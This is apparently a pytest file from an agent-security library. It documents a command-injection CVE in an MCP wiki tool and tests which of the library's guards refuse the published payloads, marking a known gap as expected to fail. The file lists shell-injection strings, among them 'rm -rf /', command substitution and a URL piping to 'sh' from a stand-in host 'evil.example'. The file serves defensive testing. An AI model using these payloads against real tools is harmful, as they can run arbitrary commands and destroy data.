"""CVE-2026-102911 — pi-llm-wiki `wiki_capture_source` splices its `url` argument into `sh -c`.

Vulnerability (from NVD, upstream issue #185 and fix commit 3608670, retrieved 2026-10-02):
    pi-llm-wiki up to 0.11.7 exposes an MCP tool, ``wiki_capture_source``, whose ``url``
    argument reaches ``extractWithMarkItDown`` in
    ``extensions/llm-wiki/lib/source-extractors.ts``. That function ran ``sh`` with these arguments:

        ["-c", `uvx --from 'markitdown[docx,pdf]' markitdown "${source}" 2>/dev/null || echo ""`]

    The value sits inside double quotes, so ``$(...)`` and backticks run where they
    stand, and a ``"`` closes the quoting so that ``;``, ``|`` or ``&&`` start a command
    of the caller's choosing. The published proof of concept sends ``url`` as
    ``";open -a Calculator;# ``. Fixed in 0.11.8 (PR #186), which passes ``source`` as
    its own argv element with no shell.

Advisory: https://github.com/zosmaai/pi-llm-wiki/issues/185
Fix:      https://github.com/zosmaai/pi-llm-wiki/commit/360867034e79175b45c8e04a98e4ca712bbaca35
NVD:      https://nvd.nist.gov/vuln/detail/CVE-2026-102911
CVSS:     9.9 (CRITICAL) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H, CWE-77 + CWE-78

Airlock fit: none.
    In scope and not refused yet: dispositioned
    ``in-scope-and-deferred-until-2026-11-02`` on issue #256. A ``url`` typed ``SafeURL``
    refuses the published payload, but only because it is not an https URL at all.
    Put the same payload inside one and ``SafeURL`` admits it, because it checks where
    a URL points (scheme, host, metadata endpoints, private ranges), not which
    characters it carries. ``StdioCommandInjectionGuard`` does refuse these characters,
    but it reads only the ``command`` and ``args`` fields of a spawn config, never an
    argument named ``url``.

    The tests that want the refusal are strict ``xfail``. The day a primitive starts
    refusing a URL that carries shell syntax they fail the build, and this fit and the
    disposition on #256 have to change with them.
"""

from __future__ import annotations

import pytest
from scripts.cve_watcher import classify_shape

from agent_airlock import Airlock, SafeURL
from agent_airlock.mcp_spec.stdio_command_injection_guard import (
    StdioCommandInjectionGuard,
    StdioCommandInjectionVerdict,
)
from agent_airlock.self_heal import BlockReason

CVE = "CVE-2026-102911"

#: NVD's description, verbatim, so the classifier assertions below are checked
#: against the real record rather than a paraphrase of it.
NVD_DESCRIPTION = (
    "A flaw has been found in zosmaai pi-llm-wiki up to 0.11.7. Affected is an unknown "
    "function of the file mcp/index.ts of the component wiki_capture_source MCP tool. "
    "Executing a manipulation of the argument url can lead to os command injection. The "
    "attack can be executed remotely. The exploit has been published and may be used. "
    "Upgrading to version 0.11.8 is able to address this issue. This patch is called "
    "360867034e79175b45c8e04a98e4ca712bbaca35. Upgrading the affected component is "
    "advised."
)

NVD_CWES = ["CWE-77", "CWE-78"]

#: The payloads upstream's own regression test feeds ``url``
#: (``test/source-extractors-security.test.ts`` in 3608670), verbatim.
UPSTREAM_PAYLOADS = (
    '";open -a Calculator;# ',
    '";echo INJECTED > /tmp/pwned;# ',
    "$(whoami)",
    "`id`",
    "a; rm -rf / #",
    "x && echo hacked",
    "x || echo hacked",
    "x\n echo hacked",
)

#: The same attack inside a well-formed https URL. Each still runs a command once it
#: is spliced into the vulnerable ``sh -c`` string: substitution runs inside double
#: quotes, and ``;`` and ``|`` run after a ``"`` has closed them.
URL_PAYLOADS = (
    ("quote break then semicolon", 'https://example.com/";open -a Calculator;# '),
    ("dollar-paren substitution", "https://example.com/$(whoami)"),
    ("backtick substitution", "https://example.com/`id`"),
    ("quote break then pipe", 'https://evil.example/run.md"|sh #'),
)

DEFERRED = pytest.mark.xfail(
    strict=True,
    raises=AssertionError,
    reason=(
        "in-scope-and-deferred-until-2026-11-02 (#256): SafeURL checks where a URL "
        "points, not which characters it carries"
    ),
)


@Airlock()
def wiki_capture_source(url: SafeURL) -> str:
    """The tool's shape, with ``url`` given the narrowest type the library ships for it."""
    return "captured"


class TestThePublishedPayloadIsRefusedForTheWrongReason:
    """Upstream's payloads are refused, by the scheme check.

    None of them is an https URL, so ``SafeURL`` refuses each one before it looks at
    anything else. That is a refusal, and it is not metacharacter detection, which is
    what the next class shows.
    """

    @pytest.mark.parametrize("payload", UPSTREAM_PAYLOADS)
    def test_it_is_refused_as_a_url_without_an_https_scheme(self, payload: str) -> None:
        result = wiki_capture_source(url=payload)
        assert isinstance(result, dict), "the published payload reached the tool body"
        assert result["block_reason"] == BlockReason.VALIDATION_ERROR.value
        assert "scheme" in result["error"]


class TestTheSamePayloadInsideAUrl:
    """What the deferral is about: strict ``xfail`` until a primitive refuses these."""

    @DEFERRED
    @pytest.mark.parametrize(("label", "url"), URL_PAYLOADS, ids=[p[0] for p in URL_PAYLOADS])
    def test_it_is_refused(self, label: str, url: str) -> None:
        result = wiki_capture_source(url=url)
        assert isinstance(result, dict), f"{label}: SafeURL admitted {url!r}"


class TestWhereTheGapIs:
    """Which primitive would have to change, pinned rather than asserted in prose."""

    def test_the_metachar_guard_knows_the_payload_and_never_reads_url(self) -> None:
        url = URL_PAYLOADS[0][1]
        guard = StdioCommandInjectionGuard()

        # Placed where the guard reads, the same string is refused...
        in_argv = guard.evaluate({"command": "uvx", "args": ["markitdown", url]})
        assert in_argv.verdict is StdioCommandInjectionVerdict.DENY_SHELL_METACHAR

        # ...and as the tool's own argument it is not looked at.
        assert guard.evaluate({"url": url}).allowed is True

    def test_a_plain_capture_url_still_reaches_the_tool(self) -> None:
        assert wiki_capture_source(url="https://example.com/page.html") == "captured"


class TestWatcherAdmittedThisOnBothSignals:
    """Either signal alone would have filed it: the description and CWE-77 / CWE-78."""

    def test_it_is_a_candidate_on_the_full_record(self) -> None:
        assert classify_shape(NVD_DESCRIPTION, NVD_CWES) == "candidate"

    def test_the_description_alone_files_it(self) -> None:
        assert classify_shape(NVD_DESCRIPTION, []) == "candidate"

    def test_the_cwes_alone_file_it(self) -> None:
        assert classify_shape("", NVD_CWES) == "candidate"
